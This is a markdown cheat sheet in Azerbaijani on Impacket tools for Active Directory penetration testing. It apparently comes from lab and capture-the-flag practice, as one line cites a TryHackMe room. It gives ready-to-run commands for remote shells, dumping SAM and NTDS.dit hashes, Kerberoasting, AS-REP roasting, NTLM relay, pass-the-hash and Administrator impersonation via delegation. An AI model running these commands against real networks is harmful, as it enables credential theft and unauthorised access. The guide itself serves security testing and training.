# 🛡️ Impacket Alətləri və İstifadə Bələdçisi

[Impacket](https://github.com/fortra/impacket), şəbəkə protokolları ilə işləmək üçün Python dilində yazılmış ən güclü kitabxanalardan biridir. Bu bələdçi, kiber təhlükəsizlik testləri zamanı ən çox istifadə olunan Impacket alətlərini və onların tətbiq üsullarını əhatə edir.

---

## 📂 Kateqoriyalar

1. Remote Execution (Uzaqdan İcra)
2. Credential Dumping (Məlumatların Çıxarılması
3. Relay & MITM Attacks
4. Active Directory Enumeration

---

## 1. Remote Execution (Uzaqdan İcra)
Hədəf sistemdə etibarnaməniz (istifadəçi adı və şifrə/hash) olduqda komanda icra etmək üçün istifadə olunur.

### 🔹 `psexec.py`
* **İzah:** Hədəf sistemdə servis yaradaraq `SYSTEM` səviyyəli interaktiv shell verir.
* **İstifadəsi:**
    ```bash
    python3 psexec.py DOMAIN/istifadeci:sifre@192.168.1.100
    ```

### 🔹 `wmiexec.py`
* **İzah:** WMI (Windows Management Instrumentation) vasitəsilə əmr icra edir. Fayl yükləmədiyi üçün Antiviruslara qarşı daha gizlidir.
* **İstifadəsi:**
    ```bash
    python3 wmiexec.py DOMAIN/istifadeci:sifre@192.168.1.100
    ```

---

## 2. Credential Dumping (Məlumatların Çıxarılması)
Sistemdə saxlanılan parolları, hash-ləri və biletləri ələ keçirmək üçün.

### 🔹 `secretsdump.py`
* **İzah:** SAM, LSA, Cached Credentials və Domain Controller-dən NTDS.dit faylını oxuyur.
* **İstifadəsi:**
    ```bash
    python3 secretsdump.py DOMAIN/istifadeci:sifre@192.168.1.100
    ```

### 🔹 `GetUserSPNs.py`
* **İzah:** **Kerberoasting** hücumu üçün servis hesablarına aid Kerberos biletlərini çəkir.
* **İstifadəsi:**
    ```bash
    python3 GetUserSPNs.py DOMAIN/istifadeci:sifre -dc-ip 192.168.1.10 -request
    ```

---

## 3. Relay & MITM Attacks
Şəbəkə daxilində autentifikasiya trafikini manipulyasiya etmək üçün.

### 🔹 `ntlmrelayx.py`
* **İzah:** Tutulan NTLM sorğularını hədəf serverə yönləndirərək icazəsiz giriş əldə edir.
* **İstifadəsi:**
    ```bash
    python3 ntlmrelayx.py -t smb://192.168.1.50 -smb2support
    ```

### 🔹 `smbserver.py`
* **İzah:** Local maşınınızda SMB paylaşımı yaradaraq fayl transferi üçün istifadə olunur.
* **İstifadəsi:**
    ```bash
    python3 smbserver.py SHARE_NAME /path/to/folder
    ```

---

## 4. Active Directory Enumeration
Domain mühitində kəşfiyyat aparmaq üçün istifadə olunan köməkçi vasitələr.

| Alət | Funksiyası |
| :--- | :--- |
| `lookupsid.py` | SID nömrələri vasitəsilə istifadəçi və qrupları tapır. |
| `GetNPUsers.py` | AS-REP Roasting üçün şifrə tələb etməyən istifadəçiləri siyahılayır. |
| `mssqlclient.py` | MSSQL serverlərinə qoşulmaq və `xp_cmdshell` icra etmək üçün. |

---

## 💡 Vacib Texnikalar

### Pass-the-Hash (PtH)
Şifrə yerinə NTLM hash istifadə edərək sistemə daxil olmaq:
```bash
python3 wmiexec.py istifadeci@192.168.1.100 -hashes :5fbc3d8433ecf0840c83a7d2f9b87648
```


`python GetNPUsers.py raz0rblack.thm/ -usersfile /tmp/user.txt -dc-ip 10.10.161.127`  - bruteforce atak edib useri tapir hashi ile birge

#### Dumping Hashes
`impacket-secretsdump -sam sam.hive -system system.hive LOCAL`  

#### Extract the Hashes
`impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL`

### impacket-findDelegation

Active Directory mühitində Kerberos delegasiya zəifliklərini tapmaq üçün istifadə olunan Impacket alətidir.  
`imapcket-findDelegation '<domen>/<username>':<password> -dc-ip <ip>`

### impacket-getST
Kerberos Service Ticket (TGS) almaq və həmin bileti başqa istifadəçi kimi (impersonation) istifadə etmək üçün işlədilən Impacket alətidir.  
`impacket-getST -spn <delegation user/domen> -impersonate Administrator "<domen>/<username>:<password>" -dc-ip <ip>`


### impacket-lookupsid

Windows / Active Directory sistemində SID-ləri (Security Identifier) user və group adlarına çevirmək və eyni zamanda mövcud user/group-ları enum etmək üçün istifadə olunan Impacket alətidir.  
`impacket-lookupsid <domain>/<user>:<password>@<ip>` ( check with guest user without password)
